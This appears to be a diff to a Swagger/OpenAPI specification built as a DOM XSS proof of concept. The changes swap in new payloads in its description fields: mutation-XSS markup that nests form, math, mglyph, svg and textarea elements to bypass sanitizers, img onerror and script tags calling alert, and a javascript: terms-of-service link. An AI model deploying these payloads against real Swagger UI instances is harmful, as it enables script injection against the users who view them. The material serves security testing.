@@ -1,8 +1,8 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <img src=x onerror="alert('XSS')"></input><input onfocus=console.log(69)><h2>XSS|
-    <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+  description: <img src=https://raw.githubusercontent.com/Sachin-v3rma/random/main/fake.svg>XSS|
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
   termsOfService: "javascript:prompt()"
   version: production
@@ -33,7 +33,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>alert('textarea')</script>"></form>
 
           format: int64
           in: path
